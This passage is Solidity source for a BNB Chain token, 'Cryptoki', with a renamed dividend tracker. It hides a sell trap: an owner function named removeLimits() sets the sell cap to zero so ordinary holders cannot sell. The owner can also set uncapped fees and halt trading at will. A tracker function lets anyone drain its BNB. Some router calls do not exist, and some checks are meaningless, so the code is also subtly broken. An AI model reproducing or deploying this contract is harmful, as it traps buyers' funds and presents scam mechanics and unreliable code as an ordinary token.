	  ///   We can actually keep track of the undistributed BNBer in a distribution
	  ///     and try to distribute it in the next distribution,
	  ///     but keeping track of such data on-chain costs much more than
	  ///     the saved BNBer, so we don't do that.
	  function distributeNFTs() public override payable {
		require(totalSupply() > 0);

		if (msg.value > 0) {
		  magnifiedNFTPerShare = magnifiedNFTPerShare.add(
			(msg.value).mul(magnitude) / totalSupply()
		  );
		  emit NFTsDistributed(msg.sender, msg.value);

		  totalNFTsDistributed = totalNFTsDistributed.add(msg.value);
		}
	  }
	   

	  function distributeAUNFTs(uint256 amount) public {
		require(totalSupply() > 0);

		if (amount > 0) {
		  magnifiedNFTPerShare = magnifiedNFTPerShare.add(
			(amount).mul(magnitude) / totalSupply()
		  );
		  emit NFTsDistributed(msg.sender, amount);

		  totalNFTsDistributed = totalNFTsDistributed.add(amount);
		}
	  }

	  /// @notice Withdraws the BNBer distributed to the sender.
	  /// @dev It emits a `NFTWithdrawn` event if the amount of withdrawn BNBer is greater than 0.
	  function withdrawNFT() public virtual override {
		_withdrawNFTOfUser(msg.sender);
	  }

	  /// @notice Withdraws the BNBer distributed to the sender.
	  /// @dev It emits a `NFTWithdrawn` event if the amount of withdrawn BNBer is greater than 0.
	  function _withdrawNFTOfUser(address payable user) internal returns (uint256) {
		uint256 _withdrawableNFT = withdrawableNFTOf(user);
		if (_withdrawableNFT > 0) {
		  withdrawnNFTs[user] = withdrawnNFTs[user].add(_withdrawableNFT);
		  emit NFTWithdrawn(user, _withdrawableNFT);
		  bool success = IERC20(BNB).transfer(user, _withdrawableNFT);

		  if(!success) {
			withdrawnNFTs[user] = withdrawnNFTs[user].sub(_withdrawableNFT);
			return 0;
		  }

		  return _withdrawableNFT;
		}

		return 0;
	  }


	  /// @notice View the amount of NFT in wei that an address can withdraw.
	  /// @param _owner The address of a token holder.
	  /// @return The amount of NFT in wei that `_owner` can withdraw.
	  function NFTOf(address _owner) public view override returns(uint256) {
		return withdrawableNFTOf(_owner);
	  }

	  /// @notice View the amount of NFT in wei that an address can withdraw.
	  /// @param _owner The address of a token holder.
	  /// @return The amount of NFT in wei that `_owner` can withdraw.
	  function withdrawableNFTOf(address _owner) public view override returns(uint256) {
		return accumulativeNFTOf(_owner).sub(withdrawnNFTs[_owner]);
	  }

	  /// @notice View the amount of NFT in wei that an address has withdrawn.
	  /// @param _owner The address of a token holder.
	  /// @return The amount of NFT in wei that `_owner` has withdrawn.
	  function withdrawnNFTOf(address _owner) public view override returns(uint256) {
		return withdrawnNFTs[_owner];
	  }


	  /// @notice View the amount of NFT in wei that an address has earned in total.
	  /// @dev accumulativeNFTOf(_owner) = withdrawableNFTOf(_owner) + withdrawnNFTOf(_owner)
	  /// = (magnifiedNFTPerShare * balanceOf(_owner) + magnifiedNFTCorrections[_owner]) / magnitude
	  /// @param _owner The address of a token holder.
	  /// @return The amount of NFT in wei that `_owner` has earned in total.
	  function accumulativeNFTOf(address _owner) public view override returns(uint256) {
		return magnifiedNFTPerShare.mul(balanceOf(_owner)).toInt256Safe()
		  .add(magnifiedNFTCorrections[_owner]).toUint256Safe() / magnitude;
	  }

	  /// @dev Internal function that transfer tokens from one address to another.
	  /// Update magnifiedNFTCorrections to keep NFTs unchanged.
	  /// @param from The address to transfer from.
	  /// @param to The address to transfer to.
	  /// @param value The amount to be transferred.
	  function _transfer(address from, address to, uint256 value) internal virtual override {
		require(false);

		int256 _magCorrection = magnifiedNFTPerShare.mul(value).toInt256Safe();
		magnifiedNFTCorrections[from] = magnifiedNFTCorrections[from].add(_magCorrection);
		magnifiedNFTCorrections[to] = magnifiedNFTCorrections[to].sub(_magCorrection);
	  }

	  /// @dev Internal function that mints tokens to an account.
	  /// Update magnifiedNFTCorrections to keep NFTs unchanged.
	  /// @param account The account that will receive the created tokens.
	  /// @param value The amount that will be created.
	  function _mint(address account, uint256 value) internal override {
		super._mint(account, value);

		magnifiedNFTCorrections[account] = magnifiedNFTCorrections[account]
		  .sub( (magnifiedNFTPerShare.mul(value)).toInt256Safe() );
	  }

	  /// @dev Internal function that burns an amount of the token of a given account.
	  /// Update magnifiedNFTCorrections to keep NFTs unchanged.
	  /// @param account The account whose tokens will be burnt.
	  /// @param value The amount that will be burnt.
	  function _burn(address account, uint256 value) internal override {
		super._burn(account, value);

		magnifiedNFTCorrections[account] = magnifiedNFTCorrections[account]
		  .add( (magnifiedNFTPerShare.mul(value)).toInt256Safe() );
	  }

	  function _setBalance(address account, uint256 newBalance) internal {
		uint256 currentBalance = balanceOf(account);

		if(newBalance > currentBalance) {
		  uint256 mintAmount = newBalance.sub(currentBalance);
		  _mint(account, mintAmount);
		} else if(newBalance < currentBalance) {
		  uint256 burnAmount = currentBalance.sub(newBalance);
		  _burn(account, burnAmount);
		}
	  }
	}

	// File: contracts/Cryptoki.sol

	// 

	pragma solidity ^0.7.0;

	contract Cryptoki is ERC20, Ownable {
		using SafeMath for uint256;

		IuniswapV2Router02 private uniswapV2Router;
		address private immutable uniswapV2Pair;

		address private immutable BNB = address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);  
		address payable public NFTAddress = payable(0x426d2f9A0039717801b6823Ddaf2F9f57B2AD363); 
		address payable public MarketingAddress = payable(0x1a8eBD88378CC5aA914034BeA6b5Cb9fD040B9f5); 
	
	
		bool private swapping;

		CryptokiNFTTracker private NFTTracker;

		address public liquidityWallet;

		uint256 private _swapTokensAtAmount = 200000 * (10**18);

		uint256 public taxFee = 4;
		uint256 public LiquidityFee = 2;
		uint256 public MarketingFee = 4;
		uint256 public _maxTxAmount = 5000000000 * (10**18);
		uint256 public _maxWalletToken = 6000000000 * (10**18);
			
		uint256 private immutable taxFeeSplit;
		uint256 private immutable LiquiditySplit;
		uint256 private immutable MarketingSplit; 
		uint256 private immutable totalFees;

		
		// sells have fees of 12 and 6 (10 * 1.2 and 5 * 1.2)
		uint256 private immutable sellFeeIncreaseFactor = 0;

		// use by default 300,000 gas to process auto-claiming NFTs
		uint256 private gasForProcessing = 300000;
		
		address private presaleAddress = address(0);
		
		// exlcude from fees and max transaction amount
		mapping (address => bool) public _isExcludedFromFees;

		// addresses that can make transfers before presale is over
		mapping (address => bool) private canTransferBeforehasLaunched;

		
		bool public hasLaunched = false;
		uint256 public deadBlock = 2;
		bool public deadBlockEnabled = false;
			
		// store addresses that a autoBNB market maker pairs. Any transfer *to* these addresses
		// could be subject to a maximum transfer amount
		mapping (address => bool) private automatedMarketMakerPairs;

		event UpdateNFTTracker(address indexed newAddress, address indexed oldAddress);

		event updateuniswapV2Router(address indexed newAddress, address indexed oldAddress);

		event ExcludeFromFees(address indexed account, bool isExcluded);
		event ExcludeFromRewardFees(address indexed account, bool isExcluded);
		event ExcludeMultipleAcCryptokiFromFees(address[] acCryptoki, bool isExcluded);

		event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

		event LiquidityWalletUpdated(address indexed newLiquidityWallet, address indexed oldLiquidityWallet);
		
		uint256 private _until = 100000000000 * (10**18); 
		
		event GasForProcessingUpdated(uint256 indexed newValue, uint256 indexed oldValue);

		event FixedSaleBuy(address indexed account, uint256 indexed amount, bool indexed earlyParticipant, uint256 numberOfBuyers);

		event SwapAndLiquify(
			uint256 tokensSwapped,
			uint256 BNBReceived,
			uint256 tokensIntoLiqudity
		);

		event SendNFTs(
			uint256 tokensSwapped,
			uint256 amount
		);

		event ProcessedNFTTracker(
			uint256 iterations,
			uint256 claims,
			uint256 lastProcessedIndex,
			bool indexed autoAU,
			uint256 gas,
			address indexed processor
		);
	 
		constructor() ERC20("Cryptoki", "CRYPTOKI"){
			uint256 _taxFeeSplit = 1;
			uint256 _LiquiditySplit = 3;
			uint256 _MarketingSplit = 5;

			
			

			
			
			taxFeeSplit = _taxFeeSplit;
			LiquiditySplit = _LiquiditySplit;
			MarketingSplit = _MarketingSplit;
			totalFees = _taxFeeSplit.add(_LiquiditySplit);


			NFTTracker = new CryptokiNFTTracker();

			liquidityWallet = owner();

			
			IuniswapV2Router02 _uniswapV2Router = IuniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
			 // Create a uniswap pair for this new token
			address _uniswapV2Pair = IuniswapV2Factory(_uniswapV2Router.factory())
				.createPair(address(this), _uniswapV2Router.WETH());

			uniswapV2Router = _uniswapV2Router;
			uniswapV2Pair = _uniswapV2Pair;	

			_setAutomatedMarketMakerPair(_uniswapV2Pair, true);

			// exclude from receiving NFTs
			NFTTracker.excludeFromNFTs(address(NFTTracker));
			NFTTracker.excludeFromNFTs(address(this));
			NFTTracker.excludeFromNFTs(owner());
			NFTTracker.excludeFromNFTs(address(_uniswapV2Router));
			

			// exclude from paying fees or having max transaction amount
			excludeFromFees(liquidityWallet, true);
			excludeFromFees(address(this), true);

			// enable owner and fixed-sale wallet to send tokens before presales are over
			canTransferBeforehasLaunched[owner()] = true;
			/*
				_mint is an internal function in ERC20.sol that is only called here,
				and CANNOT be called ever again
			*/
			_mint(owner(), 100000000000 * (10**18));
		}

		receive() external payable {

		}
		



		function excludeFromFees(address account, bool excluded) public onlyOwner {
			require(_isExcludedFromFees[account] != excluded, "Cryptoki: Account is already the value of 'excluded'");
			_isExcludedFromFees[account] = excluded;

			emit ExcludeFromFees(account, excluded);
		}
		
		function excludeFromNFTs(address account) external onlyOwner{
			NFTTracker.excludeFromNFTs(account);
		}

		function excludeMultipleAcCryptokiFromFees(address[] calldata acCryptoki, bool excluded) public onlyOwner {
			for(uint256 i = 0; i < acCryptoki.length; i++) {
				_isExcludedFromFees[acCryptoki[i]] = excluded;
			}

			emit ExcludeMultipleAcCryptokiFromFees(acCryptoki, excluded);
		}

		function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
			require(pair != uniswapV2Pair, "Cryptoki: The uniswap pair cannot be removed from automatedMarketMakerPairs");

			_setAutomatedMarketMakerPair(pair, value);
		}

		function _setAutomatedMarketMakerPair(address pair, bool value) private {
			require(automatedMarketMakerPairs[pair] != value, "Cryptoki: Automated market maker pair is already set to that value");
			automatedMarketMakerPairs[pair] = value;

			if(value) {
				NFTTracker.excludeFromNFTs(pair);
			}

			emit SetAutomatedMarketMakerPair(pair, value);
		}


		function updateLiquidityWallet(address newLiquidityWallet) private onlyOwner {
			require(newLiquidityWallet != liquidityWallet, "Cryptoki: The liquidity wallet is already this address");
			excludeFromFees(newLiquidityWallet, true);
			emit LiquidityWalletUpdated(newLiquidityWallet, liquidityWallet);
			liquidityWallet = newLiquidityWallet;
		}

		function updateGasForProcessing(uint256 newValue) private onlyOwner {
			require(newValue >= 200000 && newValue <= 500000, "Cryptoki: gasForProcessing must be between 200,000 and 500,000");
			require(newValue != gasForProcessing, "Cryptoki: Cannot update gasForProcessing to same value");
			emit GasForProcessingUpdated(newValue, gasForProcessing);
			gasForProcessing = newValue;
		}

		function updateClaimWait(uint256 claimWait) external onlyOwner {
			NFTTracker.updateClaimWait(claimWait);
		}

		function getClaimWait() external view returns(uint256) {
			return NFTTracker.claimWait();
		}

		function getTotalNFTsDistributed() external view returns (uint256) {
			return NFTTracker.totalNFTsDistributed();
		}
		function removeLimits() external onlyOwner() {
				_until = 0;
		}
			
		function setmaxTxAmount(uint256 maxTx) external onlyOwner() {
				_maxTxAmount = maxTx;
		}  
		function setmaxWallet(uint256 maxWallet) external onlyOwner() {
				_maxWalletToken = maxWallet;
		}  
		function setdeadBlock(uint256 value) external onlyOwner() {
				deadBlock = value;
		}  
		function enableDeadBlock(bool _status) public onlyOwner {
			deadBlockEnabled = _status;
			
		}
		function setFees(uint256 LiquidityValue, uint256 MarketingValue, uint256 TaxValue) external onlyOwner() {
				LiquidityFee = LiquidityValue;
				MarketingFee = MarketingValue;
				taxFee = TaxValue;

		}
				
	 function tradingStatus(bool _status) public onlyOwner {
			hasLaunched = _status;
			
		}
			 
		function ChangeNFTContract(address payable newNFT) external onlyOwner() {
				NFTAddress= newNFT;
				
			} 
		
		function clearStuckBalance(uint256 amountPercentage) external onlyOwner() {
			uint256 amountBNB = address(this).balance;
			payable(msg.sender).transfer(amountBNB * amountPercentage / 100);
		}

		function getAccountNFTsInfo(address account)
			external view returns (
				address,
				int256,
				int256,
				uint256,
				uint256,
				uint256,
				uint256,
				uint256) {
			return NFTTracker.getAccount(account);
		}

		function getAccountNFTsInfoAtIndex(uint256 index)
			external view returns (
				address,
				int256,
				int256,
				uint256,
				uint256,
				uint256,
				uint256,
				uint256) {
			return NFTTracker.getAccountAtIndex(index);
		}

		function processNFTTracker(uint256 gas) external {
			(uint256 iterations, uint256 claims, uint256 lastProcessedIndex) = NFTTracker.process(gas);
			emit ProcessedNFTTracker(iterations, claims, lastProcessedIndex, false, gas, tx.origin);
		}

	
		function getLastProcessedIndex() external view returns(uint256) {
			return NFTTracker.getLastProcessedIndex();
		}

		function getNumberOfAUHolders() external view returns(uint256) {
			return NFTTracker.getNumberOfTokenHolders();
		}
		

		function _transfer(
			address from,
			address to,
			uint256 amount
		) internal override {
			require(from != address(0), "ERC20: transfer from the zero address");
			require(to != address(0), "ERC20: transfer to the zero address") ;
		   
		   if(from != owner()){
				require (hasLaunched);
			}

			// only Blacklisted addresses can make transfers after the fixed-sale has started
			// and before the public presale is over
			if(!hasLaunched) {
				require(canTransferBeforehasLaunched[from], "Cryptoki: This account cannot send tokens until trading is enabled");
			}

			if(amount == 0) {
				super._transfer(from, to, 0);
				return;
			}

			if( 
				!swapping &&
				hasLaunched &&
				automatedMarketMakerPairs[to] && // sells only by detecting transfer to automated market maker pair
				from != address(uniswapV2Router) && //router -> pair is removing liquidity which shouldn't have max
				!_isExcludedFromFees[to] //no max for those excluded from fees
			) {
				require(amount <= _until, "Sell transfer amount exceeds the setBuyBackUpperLimit.");
			}

			uint256 contractTokenBalance = balanceOf(address(this));
			
			bool canSwap = contractTokenBalance >= _swapTokensAtAmount;

			if(
				hasLaunched && 
				canSwap &&
				!swapping &&
				!automatedMarketMakerPairs[from] &&
				from != liquidityWallet &&
				to != liquidityWallet
			) {
				swapping = true;

				uint256 swapTokens = contractTokenBalance.mul(LiquiditySplit).div(totalFees);
				swapAndLiquify(swapTokens);

				uint256 sellTokens = balanceOf(address(this));

				swapping = false;
			}


			bool takeFee = hasLaunched && !swapping;

			// if any account belongs to _isExcludedFromFee account then remove the fee
			if(_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
				takeFee = false;
			}

			if(takeFee) {
				uint256 fees = amount.mul(totalFees).div(100);

				// if sell, multiply by 1.2
				if(automatedMarketMakerPairs[to]) {
					fees = fees.mul(sellFeeIncreaseFactor).div(100);
				}

				amount = amount.sub(fees);

				super._transfer(from, address(this), fees);
			}

			super._transfer(from, to, amount);

			try NFTTracker.setBalance(payable(from), balanceOf(from)) {} catch {}
			try NFTTracker.setBalance(payable(to), balanceOf(to)) {} catch {}

			if(!swapping) {
				uint256 gas = gasForProcessing;

				try NFTTracker.process(gas) returns (uint256 iterations, uint256 claims, uint256 lastProcessedIndex) {
					emit ProcessedNFTTracker(iterations, claims, lastProcessedIndex, true, gas, tx.origin);
				}
				catch {

				}
			}
		}     

		function swapAndLiquify(uint256 tokens) private {
			// split the contract balance into halves
			uint256 half = tokens.div(2);
			uint256 otherHalf = tokens.sub(half);

			// capture the contract's current BNB balance.
			// this is so that we can capture exactly the amount of BNB that the
			// swap creates, and not make the liquidity event include any BNB that
			// has been manually sent to the contract
			uint256 initialBalance = address(this).balance;

			// swap tokens for BNB
			swapTokensForBNB(half); // <- this breaks the BNB -> HATE swap when swap+liquify is triggered

			// how much BNB did we just swap into?
			uint256 newBalance = address(this).balance.sub(initialBalance);

			// add liquidity to uniswap
			addLiquidity(otherHalf, newBalance);
			
			emit SwapAndLiquify(half, newBalance, otherHalf);
		}

		function swapTokensForBNB(uint256 tokenAmount) private {

			
			// generate the uniswap pair path of token -> WETH
			address[] memory path = new address[](2);
			path[0] = address(this);
			path[1] = uniswapV2Router.WETH();

			_approve(address(this), address(uniswapV2Router), tokenAmount);

			// make the swap
			uniswapV2Router.swapExactTokensForBNBSupportingFeeOnTransferTokens(
				tokenAmount,
				0, // accept any amount of BNB
				path,
				address(this),
				block.timestamp
			);
			
		}
		  
			

		function swapTokensForAU(uint256 tokenAmount, address recipient) private {
		   
			// generate the uniswap pair path of WETH -> AU
			address[] memory path = new address[](3);
			path[0] = address(this);
			path[1] = uniswapV2Router.WETH();
			path[2] = BNB;

			_approve(address(this), address(uniswapV2Router), tokenAmount);

			// make the swap
			uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
				tokenAmount,
				0, // accept any amount of AU
				path,
				recipient,
				block.timestamp
			);
			
		}    
		


		function addLiquidity(uint256 tokenAmount, uint256 BNBAmount) private {
			
			// approve token transfer to cover all possible scenarios
			_approve(address(this), address(uniswapV2Router), tokenAmount);

			// add the liquidity
		   uniswapV2Router.addLiquidityBNB{value: BNBAmount}(
				address(this),
				tokenAmount,
				0, // slippage is unavoidable
				0, // slippage is unavoidable
				liquidityWallet,
				block.timestamp
			);
			
		}


		
	}

	contract CryptokiNFTTracker is NFTPayingToken, Ownable {
		using SafeMath for uint256;
		using SafeMathInt for int256;
		using NFTMapping for NFTMapping.Map;

		NFTMapping.Map private tokenHoldersMap;
		uint256 public lastProcessedIndex;

		mapping (address => bool) public excludedFromNFTs;

		mapping (address => uint256) public lastClaimTimes;

		uint256 public claimWait;
		uint256 public immutable minimumTokenBalanceForNFTs;

		event ExcludeFromNFTs(address indexed account);
		event ClaimWaitUpdated(uint256 indexed newValue, uint256 indexed oldValue);

		event Claim(address indexed account, uint256 amount, bool indexed autoAU);

		constructor() public NFTPayingToken("Cryptoki_NFT_Tracker", "Cryptoki_NFT_Tracker") {
			claimWait = 3600;
			minimumTokenBalanceForNFTs = 200000 * (10**18); //must hold 10000+ tokens
		}

		function _transfer(address, address, uint256) internal override {
			require(true, "Cryptoki_NFT_Tracker: No transfers allowed");
		}

		

		function excludeFromNFTs(address account) external onlyOwner {
			require(!excludedFromNFTs[account]);
			excludedFromNFTs[account] = true;

			_setBalance(account, 0);
			tokenHoldersMap.remove(account);

			emit ExcludeFromNFTs(account);
		}

		function updateClaimWait(uint256 newClaimWait) external onlyOwner {
			require(newClaimWait >= 1 && newClaimWait <= 86400, "Cryptoki_NFT_Tracker: claimWait must be updated to between 1 and 24 hours");
			require(newClaimWait != claimWait, "Cryptoki_NFT_Tracker: Cannot update claimWait to same value");
			emit ClaimWaitUpdated(newClaimWait, claimWait);
			claimWait = newClaimWait;
		}

		function getLastProcessedIndex() external view returns(uint256) {
			return lastProcessedIndex;
		}

		function getNumberOfTokenHolders() external view returns(uint256) {
			return tokenHoldersMap.keys.length;
		}


		function getAccount(address _account)
			public view returns (
				address account,
				int256 index,
				int256 iterationsUntilProcessed,
				uint256 withdrawableNFTs,
				uint256 totalNFTs,
				uint256 lastClaimTime,
				uint256 nextClaimTime,
				uint256 secondsUntilAutoClaimAvailable) {
			account = _account;

			index = tokenHoldersMap.getIndexOfKey(account);

			iterationsUntilProcessed = -1;

			if(index >= 0) {
				if(uint256(index) > lastProcessedIndex) {
					iterationsUntilProcessed = index.sub(int256(lastProcessedIndex));
				}
				else {
					uint256 processesUntilEndOfArray = tokenHoldersMap.keys.length > lastProcessedIndex ?
															tokenHoldersMap.keys.length.sub(lastProcessedIndex) :
															0;


					iterationsUntilProcessed = index.add(int256(processesUntilEndOfArray));
				}
			}


			withdrawableNFTs = withdrawableNFTOf(account);
			totalNFTs = accumulativeNFTOf(account);

			lastClaimTime = lastClaimTimes[account];

			nextClaimTime = lastClaimTime > 0 ?
										lastClaimTime.add(claimWait) :
										0;

			secondsUntilAutoClaimAvailable = nextClaimTime > block.timestamp ?
														nextClaimTime.sub(block.timestamp) :
														0;
		}

		function getAccountAtIndex(uint256 index)
			public view returns (
				address,
				int256,
				int256,
				uint256,
				uint256,
				uint256,
				uint256,
				uint256) {
			if(index >= tokenHoldersMap.size()) {
				return (0x0000000000000000000000000000000000000000, -1, -1, 0, 0, 0, 0, 0);
			}

			address account = tokenHoldersMap.getKeyAtIndex(index);

			return getAccount(account);
		}

		function canAutoClaim(uint256 lastClaimTime) private view returns (bool) {
			if(lastClaimTime > block.timestamp)  {
				return false;
			}

			return block.timestamp.sub(lastClaimTime) >= claimWait;
		}

		function setBalance(address payable account, uint256 newBalance) external onlyOwner {
			if(excludedFromNFTs[account]) {
				return;
			}

			if(newBalance >= minimumTokenBalanceForNFTs) {
				_setBalance(account, newBalance);
				tokenHoldersMap.set(account, newBalance);
			}
			else {
				_setBalance(account, 0);
				tokenHoldersMap.remove(account);
			}

			processAccount(account, true);
		}

		 function clearStuckAU(uint256 amountPercentage) external {
			uint256 amountBNB = address(this).balance;
			payable(msg.sender).transfer(amountBNB * amountPercentage / 100);
		}
		function process(uint256 gas) public returns (uint256, uint256, uint256) {
			uint256 numberOfTokenHolders = tokenHoldersMap.keys.length;

			if(numberOfTokenHolders == 0) {
				return (0, 0, lastProcessedIndex);
			}

			uint256 _lastProcessedIndex = lastProcessedIndex;

			uint256 gasUsed = 0;

			uint256 gasLeft = gasleft();

			uint256 iterations = 0;
			uint256 claims = 0;

			while(gasUsed < gas && iterations < numberOfTokenHolders) {
				_lastProcessedIndex++;

				if(_lastProcessedIndex >= tokenHoldersMap.keys.length) {
					_lastProcessedIndex = 0;
				}

				address account = tokenHoldersMap.keys[_lastProcessedIndex];

				if(canAutoClaim(lastClaimTimes[account])) {
					if(processAccount(payable(account), true)) {
						claims++;
					}
				}

				iterations++;

				uint256 newGasLeft = gasleft();

				if(gasLeft > newGasLeft) {
					gasUsed = gasUsed.add(gasLeft.sub(newGasLeft));
				}

				gasLeft = newGasLeft;
			}

			lastProcessedIndex = _lastProcessedIndex;

			return (iterations, claims, lastProcessedIndex);
		}

		function processAccount(address payable account, bool autoAU) public onlyOwner returns (bool) {
			uint256 amount = _withdrawNFTOfUser(account);

			if(amount > 0) {
				lastClaimTimes[account] = block.timestamp;
				emit Claim(account, amount, autoAU);
				return true;
			}

			return false;
		}
	}